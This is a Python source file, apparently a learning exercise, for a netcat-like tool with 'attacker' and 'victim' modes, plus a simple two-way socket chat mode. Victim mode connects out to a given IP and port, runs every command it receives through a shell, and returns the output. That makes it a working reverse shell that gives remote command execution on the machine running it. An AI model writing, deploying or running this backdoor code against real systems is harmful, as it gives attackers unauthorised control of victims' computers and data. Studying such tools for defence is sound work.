import sys
from getopt import getopt
import socket
import subprocess
import threading

ip =""
port= 0
listen = False
command = False

def attacker_mode():
    server= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind(("127.0.0.1",port))
    
    server.listen()
    print("attacker is listening")
    connection, addr =server.accept()
    print (f"coonectec to vivtim: {addr}")
    #handle command
    while True:
        command = input("input message['exit' to close connection]: ")
        #kalau exit -> dead
        connection.send(command.encode())
        if command == "exit":
            server.close()
            break
        #command bukan exit , print resultcommandnya
        result = connection.recv(1024)
        print(f"{result.decode()}")


def victim_mode():
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.connect((ip,port))
    while True:
        command = server.recv(1024).decode()
        if command == "exit":
            server.close()
            break
        

        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
        result, err =process.communicate()

        #error check
        if err:
            server.send(err)
        elif not result:
            server.send("executed".encode())
        else:
            server.send(result)
    
def sendMesg(connection):
    while True:
        message = input("message to send: ")
        
        connection.send(message.encode())
        if message == "exit":
            connection.close()
            break
def recvMesg(connection):
    while True:
        message = connection.recv(1024).decode()
        if message == "exit":
            connection.close()
            break
        print(f"\nrecieved:{message}")

def attacker_chat_mode():
    server= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind(("127.0.0.1",port))
    server.listen()
    print("attacker is listening")
    connection, addr =server.accept()
    print (f"coonectec to vivtim: {addr}")
    
    #thread
    t1 = threading.Thread(target=sendMesg, args=(connection,))
    t2 = threading.Thread(target=recvMesg, args=(connection,))

    #start 
    t1.start()
    t2.start()

    t1,t2.join()


def VchatMode():
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.connect((ip,port))
    #thread
    t1 = threading.Thread(target=sendMesg, args=(server,))
    t2 = threading.Thread(target=recvMesg, args=(server,))

    #start 
    t1.start()
    t2.start()
    t1.join()
    t2.join()



def ipValidation(ip):
    if ip.count(".")!=3:
        return False
    for part in ip.split("."):
        part = int(part)
        if part<0 or part>255:
            return False
    return True

def help():
    print(" -i {ip} -p{port} -c[to imput command] - l[to run as attacker] ")
    exit()

def main():
    global ip, port,listen, command
    opts, _ =getopt(sys.argv[1:], "p:lchi:", {"port=", "listen", " command"," help","ip="})
    for opt, value in opts:
        # print(f"{opt}:{value}")
        if opt == "-h" or opt == "--help":
            help()
        if opt == "-i" or opt == "--ip":
            ip=value
        if opt == "-p" or opt =="--port":
            port = int(value)
        if opt =="-c" or opt =="--command":
            command =True
        if opt =="-l" or opt =="--listen":
            listen= True
        
    if port == 0:
        print("port is required")
        help()

    if listen == False and not ipValidation(ip):
        print("invalid ip")
        exit()

    #port validation
    if port >2500 or port <2000:
        print("port must be between 2000 and 2500")
        exit()
    


    if listen== True:
        if command == True:
            attacker_mode()
        else:
            attacker_chat_mode()
    else :
        if command == True:
            victim_mode()
        else:
            print("v chat mode")
            VchatMode()

main()